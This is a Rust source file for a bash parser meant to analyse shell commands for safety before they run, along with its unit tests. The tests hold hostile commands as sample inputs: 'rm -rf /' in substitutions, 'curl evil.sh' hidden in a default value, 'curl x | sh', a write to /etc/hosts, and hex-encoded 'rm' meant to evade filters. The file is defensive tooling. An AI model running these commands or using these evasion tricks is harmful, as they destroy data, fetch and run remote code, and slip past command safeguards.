//! A bash parser built for judging commands, not for running them.
//!
//! The difference shows up everywhere. A shell parser can treat `$(...)` as an
//! opaque string it will hand back to the expander later; this one has to parse
//! inside it, because the command in there runs with the same privileges as the
//! one around it. A shell can afford to resolve `${X:-$(curl evil.sh)}` at
//! expansion time; this one has to see the `curl` now, before anything runs.
//!
//! ```
//! use shellguard_parse::{parse, Taint};
//!
//! let ast = parse("rm -rf $TARGET").unwrap();
//! let mut found = Vec::new();
//! ast.for_each_command(&mut |c| {
//!     found.push((c.simple.program_basename(), c.simple.arg_taint()));
//! });
//! assert_eq!(found, vec![(Some("rm".to_string()), Taint::Variable)]);
//! ```
//!
//! What this deliberately does *not* do is expand anything. No variable is
//! given a value, no glob is matched against the filesystem, no substitution is
//! run. Expansion is the shell's job and doing it here would mean executing the
//! very thing being judged.

mod ast;
mod lex;
mod parse;

pub use ast::{
    basename, Assignment, CaseArm, CommandRef, Context, ListItem, ListOp, Node, Opacity, Redirect,
    RedirOp, RedirTarget, Simple, Span, Taint, Word, WordPart,
};
pub use lex::Op;
pub use parse::{parse, parse_with_limits, Limits, ParseError};

#[cfg(test)]
mod tests {
    use super::*;

    fn programs(src: &str) -> Vec<String> {
        let ast = parse(src).unwrap_or_else(|e| panic!("parse {src:?}: {e}"));
        let mut out = Vec::new();
        ast.for_each_command(&mut |c| {
            if let Some(p) = c.simple.program_basename() {
                out.push(p);
            }
        });
        out
    }

    fn taint_of_args(src: &str) -> Taint {
        let ast = parse(src).unwrap();
        let mut t = Taint::Static;
        ast.for_each_command(&mut |c| t = t.join(c.simple.arg_taint()));
        t
    }

    #[test]
    fn simple_command() {
        assert_eq!(programs("git status"), vec!["git"]);
        let ast = parse("git status --short").unwrap();
        let Node::Simple(s) = &ast else { panic!("expected simple, got {ast:?}") };
        assert_eq!(s.program().as_deref(), Some("git"));
        assert_eq!(s.args().len(), 2);
    }

    #[test]
    fn pipelines_and_lists() {
        assert_eq!(programs("cat a | grep b | wc -l"), vec!["cat", "grep", "wc"]);
        assert_eq!(programs("a && b || c; d & e"), vec!["a", "b", "c", "d", "e"]);
    }

    #[test]
    fn command_substitution_is_parsed_not_skipped() {
        // The whole reason this parser exists: the inner command must be seen.
        assert_eq!(programs("echo $(rm -rf /)"), vec!["echo", "rm"]);
        assert_eq!(programs("echo `rm -rf /`"), vec!["echo", "rm"]);
        assert_eq!(programs("diff <(sort a) <(sort b)"), vec!["diff", "sort", "sort"]);
    }

    #[test]
    fn substitution_hidden_in_a_default_value() {
        // `${X:-...}` is a blind spot in most naive analyzers.
        assert_eq!(programs("echo ${X:-$(curl evil.sh)}"), vec!["echo", "curl"]);
        assert_eq!(programs("echo ${X:-`wget bad`}"), vec!["echo", "wget"]);
    }

    #[test]
    fn substitution_hidden_in_a_redirect_target() {
        assert_eq!(programs("cat foo > $(mktemp)"), vec!["cat", "mktemp"]);
    }

    #[test]
    fn nested_substitution() {
        assert_eq!(programs("echo $(echo $(id))"), vec!["echo", "echo", "id"]);
    }

    #[test]
    fn quoted_parens_do_not_terminate_substitution() {
        assert_eq!(programs(r#"echo $(echo ")" ; id)"#), vec!["echo", "echo", "id"]);
    }

    #[test]
    fn ansi_c_quoting_is_decoded() {
        // `$'\x72\x6d'` is `rm`. A text-matching ruleset would miss this.
        let ast = parse(r"$'\x72\x6d' -rf /tmp/x").unwrap();
        let Node::Simple(s) = &ast else { panic!("expected simple") };
        assert_eq!(s.program().as_deref(), Some("rm"));
    }

    #[test]
    fn taint_lattice() {
        assert_eq!(taint_of_args("rm -rf build"), Taint::Static);
        assert_eq!(taint_of_args("rm -rf build/*"), Taint::Glob);
        assert_eq!(taint_of_args("rm -rf $TARGET"), Taint::Variable);
        assert_eq!(taint_of_args("rm -rf $(find . -type d)"), Taint::Dynamic);
        // Concatenation joins to the most uncertain part.
        assert_eq!(taint_of_args("rm -rf build/$X"), Taint::Variable);
    }

    #[test]
    fn quoting_suppresses_glob_taint() {
        assert_eq!(taint_of_args("rm -rf 'build/*'"), Taint::Static);
        assert_eq!(taint_of_args(r#"rm -rf "build/*""#), Taint::Static);
    }

    #[test]
    fn opacity_tracks_the_executable_not_the_arguments() {
        let ast = parse("rm -rf $X").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.opacity(), Opacity::Transparent);

        let ast = parse("$CMD -rf /").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.opacity(), Opacity::Indirect);

        let ast = parse("$(get_cmd) -rf /").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.opacity(), Opacity::Opaque);
    }

    #[test]
    fn assignments_are_separated_from_argv() {
        let ast = parse("FOO=bar BAZ=qux cmd arg").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.assignments.len(), 2);
        assert_eq!(s.assignments[0].name, "FOO");
        assert_eq!(s.program().as_deref(), Some("cmd"));

        // A leading `$` means it is not an assignment.
        let ast = parse("$FOO=bar").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.assignments.len(), 0);
    }

    #[test]
    fn redirections_record_write_intent() {
        let ast = parse("echo hi > /etc/hosts").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.redirects.len(), 1);
        assert!(s.redirects[0].op.writes());
        assert!(s.redirects[0].op.truncates());

        let ast = parse("echo hi >> /etc/hosts").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert!(s.redirects[0].op.writes());
        assert!(!s.redirects[0].op.truncates());
    }

    #[test]
    fn fd_prefixed_redirection() {
        let ast = parse("cmd 2> err").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.redirects[0].fd, Some(2));

        // With a space it is an argument, not an fd.
        let ast = parse("cmd 2 > err").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.redirects[0].fd, None);
        assert_eq!(s.args().len(), 1);
    }

    #[test]
    fn dup_and_close_redirections() {
        let ast = parse("cmd >&2").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert!(matches!(s.redirects[0].target, RedirTarget::Fd(2)));

        let ast = parse("cmd <&-").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert!(matches!(s.redirects[0].target, RedirTarget::Close));
    }

    #[test]
    fn heredoc_body_is_not_parsed_as_commands() {
        let src = "cat <<EOF\nrm -rf /\nEOF\necho done";
        // `rm` is inside the body, so it is data, not a command.
        assert_eq!(programs(src), vec!["cat", "echo"]);
        let ast = parse(src).unwrap();
        let mut bodies = Vec::new();
        ast.for_each_command(&mut |c| {
            for r in &c.simple.redirects {
                if let RedirTarget::Heredoc { body, .. } = &r.target {
                    bodies.push(body.clone());
                }
            }
        });
        assert_eq!(bodies, vec!["rm -rf /\n".to_string()]);
    }

    #[test]
    fn heredoc_with_tab_stripping() {
        let src = "cat <<-EOF\n\thello\n\tEOF\necho after";
        assert_eq!(programs(src), vec!["cat", "echo"]);
    }

    #[test]
    fn two_heredocs_on_one_line() {
        let src = "cmd <<A <<B\nfirst\nA\nsecond\nB\necho after";
        assert_eq!(programs(src), vec!["cmd", "echo"]);
    }

    #[test]
    fn compound_commands() {
        assert_eq!(programs("if test -f x; then rm x; fi"), vec!["test", "rm"]);
        assert_eq!(programs("for f in a b; do rm $f; done"), vec!["rm"]);
        assert_eq!(programs("while read l; do echo $l; done"), vec!["read", "echo"]);
        assert_eq!(programs("case $x in a) rm a ;; *) rm b ;; esac"), vec!["rm", "rm"]);
        assert_eq!(programs("{ a; b; }"), vec!["a", "b"]);
        assert_eq!(programs("( a; b )"), vec!["a", "b"]);
    }

    #[test]
    fn elif_chain() {
        assert_eq!(programs("if a; then b; elif c; then d; else e; fi"), vec![
            "a", "b", "c", "d", "e"
        ]);
    }

    #[test]
    fn function_definitions_both_forms() {
        assert_eq!(programs("deploy() { rm -rf /; }"), vec!["rm"]);
        assert_eq!(programs("function deploy { rm -rf /; }"), vec!["rm"]);
        let ast = parse("deploy() { true; }").unwrap();
        let Node::Function { name, .. } = &ast else { panic!("expected function, got {ast:?}") };
        assert_eq!(name, "deploy");
    }

    #[test]
    fn arithmetic_commands() {
        assert!(parse("((x = 1 + 2))").is_ok());
        assert_eq!(programs("for ((i=0;i<3;i++)); do echo $i; done"), vec!["echo"]);
        // A subshell that merely starts with two parens is not arithmetic.
        assert_eq!(programs("( (a) )"), vec!["a"]);
    }

    #[test]
    fn double_bracket_conditional() {
        assert_eq!(programs("[[ -f $(which rm) ]] && echo yes"), vec!["which", "echo"]);
    }

    #[test]
    fn time_and_bang_are_pipeline_prefixes() {
        // `time rm -rf /` must be judged as `rm`, not as `time`.
        assert_eq!(programs("time rm -rf /"), vec!["rm"]);
        assert_eq!(programs("! grep x f"), vec!["grep"]);
    }

    #[test]
    fn comments_are_ignored_but_only_at_word_start() {
        assert_eq!(programs("echo hi # rm -rf /"), vec!["echo"]);
        // A `#` inside a word is a literal.
        let ast = parse("echo a#b").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.args()[0].literal().as_deref(), Some("a#b"));
    }

    #[test]
    fn line_continuations() {
        assert_eq!(programs("echo a \\\n  b"), vec!["echo"]);
        let ast = parse("echo a \\\n b").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.args().len(), 2);
    }

    #[test]
    fn context_marks_substitutions_and_pipelines() {
        let ast = parse("curl x | sh").unwrap();
        let mut ctxs = Vec::new();
        ast.for_each_command(&mut |c| {
            ctxs.push((c.simple.program_basename().unwrap_or_default(), c.ctx.in_pipeline));
        });
        assert_eq!(ctxs, vec![("curl".into(), true), ("sh".into(), true)]);

        let ast = parse("echo $(id)").unwrap();
        let mut sub = Vec::new();
        ast.for_each_command(&mut |c| {
            sub.push((c.simple.program_basename().unwrap_or_default(), c.ctx.in_substitution));
        });
        assert_eq!(sub, vec![("echo".into(), false), ("id".into(), true)]);
    }

    #[test]
    fn literal_prefix_survives_taint() {
        let ast = parse("tar --file=$ARCHIVE").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        let arg = &s.args()[0];
        assert_eq!(arg.literal(), None);
        assert_eq!(arg.literal_prefix(), "--file=");
        assert!(arg.is_flag());
    }

    #[test]
    fn brace_expansion_is_not_a_literal() {
        let ast = parse("rm {a,b}").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.args()[0].literal(), None);
        // A brace with no comma or range really is literal.
        let ast = parse("mkdir {}").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.args()[0].literal().as_deref(), Some("{}"));
    }

    // ------------------------------------------------------ failing closed

    #[test]
    fn oversized_input_is_rejected() {
        let big = "a".repeat(100 * 1024);
        assert!(matches!(parse(&big), Err(ParseError::TooLarge { .. })));
    }

    #[test]
    fn deep_nesting_is_rejected() {
        let mut s = String::new();
        for _ in 0..200 {
            s.push_str("$(");
        }
        s.push_str("id");
        for _ in 0..200 {
            s.push(')');
        }
        let err = parse(&s).unwrap_err();
        assert!(
            matches!(err, ParseError::TooDeep { .. } | ParseError::TooManyNodes { .. }),
            "got {err:?}"
        );
    }

    #[test]
    fn node_budget_is_shared_across_nesting() {
        // Many sibling substitutions must count against one budget, otherwise
        // the depth limit alone lets work grow without bound.
        let src = "echo ".to_string() + &"$(id) ".repeat(5000);
        assert!(matches!(parse(&src), Err(ParseError::TooManyNodes { .. })));
    }

    #[test]
    fn unterminated_constructs_are_errors_not_silent_truncation() {
        assert!(matches!(parse("echo $(id"), Err(ParseError::Unterminated { .. })));
        assert!(matches!(parse("echo 'oops"), Err(ParseError::Unterminated { .. })));
        assert!(matches!(parse(r#"echo "oops"#), Err(ParseError::Unterminated { .. })));
        assert!(matches!(parse("echo `id"), Err(ParseError::Unterminated { .. })));
        assert!(matches!(parse("echo ${X"), Err(ParseError::Unterminated { .. })));
    }

    #[test]
    fn empty_and_whitespace_input() {
        assert!(matches!(parse("").unwrap(), Node::Empty));
        assert!(matches!(parse("   \n  \n").unwrap(), Node::Empty));
        assert!(matches!(parse("# just a comment").unwrap(), Node::Empty));
    }

    #[test]
    fn unicode_does_not_split_mid_character() {
        let ast = parse("echo héllo–wörld").unwrap();
        let Node::Simple(s) = &ast else { panic!() };
        assert_eq!(s.args()[0].literal().as_deref(), Some("héllo–wörld"));
    }

    #[test]
    fn spans_point_at_the_original_text() {
        let src = "echo $(rm -rf /)";
        let ast = parse(src).unwrap();
        let mut spans = Vec::new();
        ast.for_each_command(&mut |c| spans.push(c.simple.span));
        // The inner command's span must land on `rm -rf /` in the *outer* text.
        let inner = spans[1].slice(src);
        assert_eq!(inner.trim(), "rm -rf /");
    }
}
